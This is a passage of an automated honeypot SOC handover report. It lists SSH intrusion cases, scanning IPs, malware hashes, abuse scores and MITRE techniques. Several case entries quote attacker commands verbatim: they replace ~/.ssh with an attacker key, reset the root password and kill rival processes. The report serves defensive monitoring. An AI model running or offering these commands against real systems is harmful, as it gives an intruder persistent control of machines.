| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Jg7fMQBx7ymB"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 22:05:54` | `cowrie.session.connect` |
| `2026-05-09 22:05:54` | `cowrie.client.version` |
| `2026-05-09 22:05:55` | `cowrie.client.kex` |
| `2026-05-09 22:05:56` | `cowrie.login.success` |
| `2026-05-09 22:05:56` | `cowrie.session.params` |
| `2026-05-09 22:05:56` | `cowrie.command.input` |
| `2026-05-09 22:05:56` | `cowrie.command.failed` |
| `2026-05-09 22:05:57` | `cowrie.log.closed` |
| `2026-05-09 22:05:57` | `cowrie.session.params` |
| `2026-05-09 22:05:57` | `cowrie.command.input` |
| `2026-05-09 22:05:57` | `cowrie.session.file_download` |
| `2026-05-09 22:05:57` | `cowrie.log.closed` |
| `2026-05-09 22:06:07` | `cowrie.session.params` |
| `2026-05-09 22:06:07` | `cowrie.command.input` |
| `2026-05-09 22:06:07` | `cowrie.log.closed` |
| `2026-05-09 22:06:07` | `cowrie.session.params` |
| `2026-05-09 22:06:07` | `cowrie.command.input` |
| `2026-05-09 22:06:08` | `cowrie.log.closed` |
| `2026-05-09 22:06:08` | `cowrie.session.params` |
| `2026-05-09 22:06:08` | `cowrie.command.input` |
| `2026-05-09 22:06:09` | `cowrie.session.file_download` |
| `2026-05-09 22:06:09` | `cowrie.log.closed` |
| `2026-05-09 22:06:09` | `cowrie.session.params` |
| `2026-05-09 22:06:09` | `cowrie.command.input` |
| `2026-05-09 22:06:10` | `cowrie.log.closed` |
| `2026-05-09 22:06:10` | `cowrie.session.params` |
| `2026-05-09 22:06:10` | `cowrie.command.input` |
| `2026-05-09 22:06:10` | `cowrie.log.closed` |
| `2026-05-09 22:06:11` | `cowrie.session.params` |
| `2026-05-09 22:06:11` | `cowrie.command.input` |
| `2026-05-09 22:06:11` | `cowrie.command.input` |
| `2026-05-09 22:06:11` | `cowrie.log.closed` |
| `2026-05-09 22:06:12` | `cowrie.session.params` |
| `2026-05-09 22:06:12` | `cowrie.command.input` |
| `2026-05-09 22:06:12` | `cowrie.log.closed` |
| `2026-05-09 22:06:13` | `cowrie.session.params` |
| `2026-05-09 22:06:13` | `cowrie.command.input` |
| `2026-05-09 22:06:13` | `cowrie.log.closed` |
| `2026-05-09 22:06:14` | `cowrie.session.params` |
| `2026-05-09 22:06:14` | `cowrie.command.input` |
| `2026-05-09 22:06:14` | `cowrie.log.closed` |
| `2026-05-09 22:06:15` | `cowrie.session.params` |
| `2026-05-09 22:06:15` | `cowrie.command.input` |
| `2026-05-09 22:06:15` | `cowrie.log.closed` |
| `2026-05-09 22:06:15` | `cowrie.session.params` |
| `2026-05-09 22:06:15` | `cowrie.command.input` |
| `2026-05-09 22:06:16` | `cowrie.log.closed` |
| `2026-05-09 22:06:16` | `cowrie.session.params` |
| `2026-05-09 22:06:16` | `cowrie.command.input` |
| `2026-05-09 22:06:16` | `cowrie.log.closed` |
| `2026-05-09 22:06:17` | `cowrie.session.params` |
| `2026-05-09 22:06:17` | `cowrie.command.input` |
| `2026-05-09 22:06:17` | `cowrie.log.closed` |
| `2026-05-09 22:06:18` | `cowrie.session.params` |
| `2026-05-09 22:06:18` | `cowrie.command.input` |
| `2026-05-09 22:06:18` | `cowrie.log.closed` |
| `2026-05-09 22:06:19` | `cowrie.session.params` |
| `2026-05-09 22:06:19` | `cowrie.command.input` |
| `2026-05-09 22:06:19` | `cowrie.log.closed` |
| `2026-05-09 22:06:20` | `cowrie.session.params` |
| `2026-05-09 22:06:20` | `cowrie.command.input` |
| `2026-05-09 22:06:20` | `cowrie.log.closed` |
| `2026-05-09 22:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d50e2c1fe7

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-05-09 22:14 |
| **Last Seen** | 2026-05-09 22:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 22:14:01` | `cowrie.session.connect` |
| `2026-05-09 22:14:01` | `cowrie.client.version` |
| `2026-05-09 22:14:01` | `cowrie.client.kex` |
| `2026-05-09 22:14:02` | `cowrie.login.success` |
| `2026-05-09 22:14:03` | `cowrie.session.params` |
| `2026-05-09 22:14:03` | `cowrie.command.input` |
| `2026-05-09 22:14:03` | `cowrie.command.failed` |
| `2026-05-09 22:14:03` | `cowrie.log.closed` |
| `2026-05-09 22:14:04` | `cowrie.session.params` |
| `2026-05-09 22:14:04` | `cowrie.command.input` |
| `2026-05-09 22:14:04` | `cowrie.session.file_download` |
| `2026-05-09 22:14:04` | `cowrie.log.closed` |
| `2026-05-09 22:14:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-653bdb1f1fd5

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-05-09 22:14 |
| **Last Seen** | 2026-05-09 22:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 22:14:10` | `cowrie.session.connect` |
| `2026-05-09 22:14:10` | `cowrie.client.version` |
| `2026-05-09 22:14:10` | `cowrie.client.kex` |
| `2026-05-09 22:14:11` | `cowrie.login.success` |
| `2026-05-09 22:14:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88cf357b06e3

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-05-09 22:24 |
| **Last Seen** | 2026-05-09 22:24 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:B2yTO9tQZVir"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 22:24:09` | `cowrie.session.connect` |
| `2026-05-09 22:24:09` | `cowrie.client.version` |
| `2026-05-09 22:24:09` | `cowrie.client.kex` |
| `2026-05-09 22:24:10` | `cowrie.login.success` |
| `2026-05-09 22:24:11` | `cowrie.session.params` |
| `2026-05-09 22:24:11` | `cowrie.command.input` |
| `2026-05-09 22:24:11` | `cowrie.command.failed` |
| `2026-05-09 22:24:11` | `cowrie.log.closed` |
| `2026-05-09 22:24:12` | `cowrie.session.params` |
| `2026-05-09 22:24:12` | `cowrie.command.input` |
| `2026-05-09 22:24:12` | `cowrie.session.file_download` |
| `2026-05-09 22:24:12` | `cowrie.log.closed` |
| `2026-05-09 22:24:21` | `cowrie.session.params` |
| `2026-05-09 22:24:21` | `cowrie.command.input` |
| `2026-05-09 22:24:21` | `cowrie.log.closed` |
| `2026-05-09 22:24:22` | `cowrie.session.params` |
| `2026-05-09 22:24:22` | `cowrie.command.input` |
| `2026-05-09 22:24:22` | `cowrie.log.closed` |
| `2026-05-09 22:24:23` | `cowrie.session.params` |
| `2026-05-09 22:24:23` | `cowrie.command.input` |
| `2026-05-09 22:24:23` | `cowrie.session.file_download` |
| `2026-05-09 22:24:23` | `cowrie.log.closed` |
| `2026-05-09 22:24:24` | `cowrie.session.params` |
| `2026-05-09 22:24:24` | `cowrie.command.input` |
| `2026-05-09 22:24:24` | `cowrie.log.closed` |
| `2026-05-09 22:24:24` | `cowrie.session.params` |
| `2026-05-09 22:24:24` | `cowrie.command.input` |
| `2026-05-09 22:24:25` | `cowrie.log.closed` |
| `2026-05-09 22:24:25` | `cowrie.session.params` |
| `2026-05-09 22:24:25` | `cowrie.command.input` |
| `2026-05-09 22:24:25` | `cowrie.command.input` |
| `2026-05-09 22:24:26` | `cowrie.log.closed` |
| `2026-05-09 22:24:26` | `cowrie.session.params` |
| `2026-05-09 22:24:26` | `cowrie.command.input` |
| `2026-05-09 22:24:27` | `cowrie.log.closed` |
| `2026-05-09 22:24:27` | `cowrie.session.params` |
| `2026-05-09 22:24:27` | `cowrie.command.input` |
| `2026-05-09 22:24:27` | `cowrie.log.closed` |
| `2026-05-09 22:24:28` | `cowrie.session.params` |
| `2026-05-09 22:24:28` | `cowrie.command.input` |
| `2026-05-09 22:24:28` | `cowrie.log.closed` |
| `2026-05-09 22:24:29` | `cowrie.session.params` |
| `2026-05-09 22:24:29` | `cowrie.command.input` |
| `2026-05-09 22:24:29` | `cowrie.log.closed` |
| `2026-05-09 22:24:30` | `cowrie.session.params` |
| `2026-05-09 22:24:30` | `cowrie.command.input` |
| `2026-05-09 22:24:30` | `cowrie.log.closed` |
| `2026-05-09 22:24:31` | `cowrie.session.params` |
| `2026-05-09 22:24:31` | `cowrie.command.input` |
| `2026-05-09 22:24:31` | `cowrie.log.closed` |
| `2026-05-09 22:24:32` | `cowrie.session.params` |
| `2026-05-09 22:24:32` | `cowrie.command.input` |
| `2026-05-09 22:24:32` | `cowrie.log.closed` |
| `2026-05-09 22:24:32` | `cowrie.session.params` |
| `2026-05-09 22:24:32` | `cowrie.command.input` |
| `2026-05-09 22:24:33` | `cowrie.log.closed` |
| `2026-05-09 22:24:33` | `cowrie.session.params` |
| `2026-05-09 22:24:33` | `cowrie.command.input` |
| `2026-05-09 22:24:33` | `cowrie.log.closed` |
| `2026-05-09 22:24:34` | `cowrie.session.params` |
| `2026-05-09 22:24:34` | `cowrie.command.input` |
| `2026-05-09 22:24:34` | `cowrie.log.closed` |
| `2026-05-09 22:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `138.197.147[.]76` | **137** | 2026-05-09 20:50 | 2026-05-09 22:35 | 85m | 0 | `T1592` | 🟠 MEDIUM |
| `103.84.236[.]222` | **30** | 2026-05-09 20:51 | 2026-05-09 21:20 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `77.237.234[.]238` | **29** | 2026-05-09 20:54 | 2026-05-09 21:22 | 0m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `138.197.200[.]106` | **18** | 2026-05-09 21:49 | 2026-05-09 22:35 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `135.232.182[.]226` | **14** | 2026-05-09 21:03 | 2026-05-09 22:41 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `150.95.25[.]34` | **10** | 2026-05-09 21:23 | 2026-05-09 22:46 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `78.188.98[.]222` | **4** | 2026-05-09 21:08 | 2026-05-09 21:10 | 8m | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]98` | **2** | 2026-05-09 21:46 | 2026-05-09 21:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]15` | 1 | 2026-05-09 22:33 | 2026-05-09 22:33 | 4s | 0 | `T1592` | 🟢 LOW |
| `121.147.220[.]27` | 1 | 2026-05-09 21:39 | 2026-05-09 21:39 | 13s | 0 | `T1592` | 🟢 LOW |
| `121.29.4[.]79` | 1 | 2026-05-09 20:51 | 2026-05-09 20:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.24.211[.]100` | 1 | 2026-05-09 21:38 | 2026-05-09 21:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.73.148[.]0` | 1 | 2026-05-09 22:49 | 2026-05-09 22:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.73.148[.]35` | 1 | 2026-05-09 22:44 | 2026-05-09 22:44 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `138.197.147[.]76` | CA | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `77.237.234[.]238` | FR | Contabo GmbH | **100** ⚠️ | 0 |
| `193.24.211[.]100` | BG | Layer7 Networks GmbH | **100** ⚠️ | 1 |
| `150.95.25[.]34` | TH | ZCOM THAI | **100** ⚠️ | 0 |
| `138.197.200[.]106` | US | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `78.188.98[.]222` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 4 |
| `212.73.148[.]35` | SG | NL MODAT | **100** ⚠️ | 50 |
| `135.232.182[.]226` | US | Microsoft Limited | **100** ⚠️ | 0 |
| `212.73.148[.]0` | SG | NL MODAT | **100** ⚠️ | 50 |
| `103.84.236[.]222` | IN | Blue Sky Broadband Pvt. Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 96 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 76 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 281 cases |
| Tool 34  | Credential Extractor        | ✅ 92 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 29 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (5.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 16 priority case(s) shown individually · 14 recon entry/entries in table (8 group(s) consolidating 244 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-09T22:52:18Z_
